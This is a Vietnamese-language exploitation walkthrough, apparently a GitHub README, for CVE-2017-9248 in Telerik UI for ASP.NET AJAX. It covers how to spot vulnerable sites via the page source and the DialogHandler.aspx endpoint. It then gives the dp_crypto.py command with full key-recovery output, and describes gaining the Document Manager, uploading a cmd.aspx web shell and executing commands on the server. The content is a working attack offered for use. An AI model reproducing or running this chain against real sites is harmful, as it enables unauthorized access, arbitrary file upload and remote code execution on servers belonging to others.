# Khai thác lỗ hổng ứng dụng Web qua Telerik Web Ui trên Framework Asp.Net
Đây là CVE 2017-9248, lỗ hổng bảo mật này cực kỳ nghiêm trọng, tồn tại do mã hóa yếu trong tệp tin Telerik.Web.UI.dll (Telerik UI for ASP.NET AJAX components). Khai thác lỗ hổng này hacker có thể giải mã ra key (Telerik.Web.UI.DialogParametersEncryptionKey and/or the MachineKey), từ đó có được đường link quản trị nội dung tệp tin và có thể tải tệp tin lên máy chủ nếu cấu hình cho phép (mặc định là cho phép). Lỗ hổng này tồn tại ở các phiên bản từ 2012.3.1308 đến 2017.1.118 (.NET 35, 40, 45).

##Cách xác định lỗ hổng:
Mở source web bằng cách Kích phải View page source hay Ctrl+U sau đó bấm Ctrl +F search với từ khóa “Telerik.Web.UI”:  
![image](https://user-images.githubusercontent.com/59444526/177038531-c2af3a07-2e45-4f3e-9914-7548dca10889.png)

OK, và bên dưới là danh sách các phiên bản có thể bị khai thác 2013.1.220 =>2017.2.503  
Trước khi thực hiện exploit, các bạn xác định được tập tin “Dialog Handler” bằng cách request
https://www.example.com/Telerik.Web.UI.DialogHandler.aspx, nếu kết quả bạn nhận lại được là chuỗi “Loading the dialog…” thì boom bạn đã đi đúng hướng.  
![image](https://user-images.githubusercontent.com/59444526/177038610-73a30d87-7ced-4c20-adcf-48fb14fe78b1.png)

## Chạy mã khai thác
*root@Sugib3o~# python dp_crypto.py -k http://www.example.com/Telerik.Web.UI.DialogHandler.aspx 48 hex 9*  

*dp_crypto by Paul Taylor / Foregenix Ltd*  
*CVE-2017-9248 - Telerik.Web.UI.dll Cryptographic compromise*  

*Attacking http://www.example.com/Telerik.Web.UI.DialogHandler.aspx*  
*to find key of length [48] with accuracy threshold [9]*  
*using key charset [01234567890ABCDEF]*  

*Key position 01: {D} found with 31 requests, total so far: 31*  
*Key position 02: {3} found with 10 requests, total so far: 41*  
*Key position 03: {A} found with 35 requests, total so far: 76*  
*Key position 04: {D} found with 46 requests, total so far: 122*  
*<------------------------ SNIPPED ------------------------>*  
*Key position 45: {B} found with 50 requests, total so far: 1638*  
*Key position 46: {3} found with 36 requests, total so far: 1674*  
*Key position 47: {3} found with 50 requests, total so far: 1724*  
*Key position 48: {F} found with 57 requests, total so far: 1781*  
*Found key: D3AD[redacted]B33F*  
*Total web requests: 1781*  
*2014.3.1024: http://www.example.com/Telerik.Web.UI.DialogHandler.aspx?DialogName=DocumentManager&renderMode=2&Skin=Default&Title=Document%20Manager&dpptn=&isRtl=false&dp=[snipped&redacted]*  

Bằng cách truy cập liên kết "Document Manager", chúng tôi thấy rằng giờ đây chúng tôi có quyền truy cập vào tất cả các tệp và thư mục của máy chủ web. Quan trọng hơn, chúng tôi thấy rằng chúng tôi có thể tải các tệp tùy ý lên máy chủ.  
![image](https://user-images.githubusercontent.com/59444526/177039103-5d23d135-9509-4967-ba53-0e19edccbd96.png)
Đây là ví dụ về tệp shell cmd.aspx đã tải lên.
![image](https://user-images.githubusercontent.com/59444526/177039127-f56a5cdf-adb0-4818-b724-ae547d05e45d.png)
Và đây là một ví dụ về thực thi lệnh bằng cách sử dụng trình shell đã tải lên.  
![image](https://user-images.githubusercontent.com/59444526/177039182-afe9824e-eaca-44ba-9f6e-b99579f1931b.png)

